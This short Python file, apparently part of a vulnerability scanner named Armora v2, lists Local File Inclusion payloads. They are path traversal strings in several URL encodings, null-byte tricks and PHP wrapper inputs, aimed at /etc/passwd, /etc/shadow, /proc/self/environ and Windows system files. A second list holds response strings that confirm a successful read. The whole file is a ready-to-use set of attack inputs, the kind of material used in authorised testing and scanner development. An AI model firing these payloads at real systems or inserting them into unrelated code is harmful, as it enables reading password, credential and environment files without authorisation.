"""
LFI (Local File Inclusion) Payloads — Armora v2.

Path traversal payloads for both Linux and Windows targets.
"""

LFI_PAYLOADS = [
    # Linux
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    # Windows
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "C:\\windows\\win.ini",
    "C:\\boot.ini",
    # Null-byte (legacy PHP)
    "../../etc/passwd%00",
    "../../etc/passwd\x00",
    # Wrapper-based
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "file:///etc/passwd",
]

# Signatures confirming successful LFI
LFI_SUCCESS_SIGNATURES = [
    # Linux /etc/passwd
    "root:x:0:0",
    "daemon:x:",
    "bin:x:",
    "nobody:x:",
    # Linux /etc/hosts
    "127.0.0.1",
    # Linux /proc/self/environ
    "PATH=",
    "HOME=",
    # Windows win.ini
    "[fonts]",
    "[extensions]",
    "[mci extensions]",
    # Windows boot.ini
    "[boot loader]",
    "[operating systems]",
    # PHP wrappers
    "PD9waHA",  # base64 of "<?php"
]
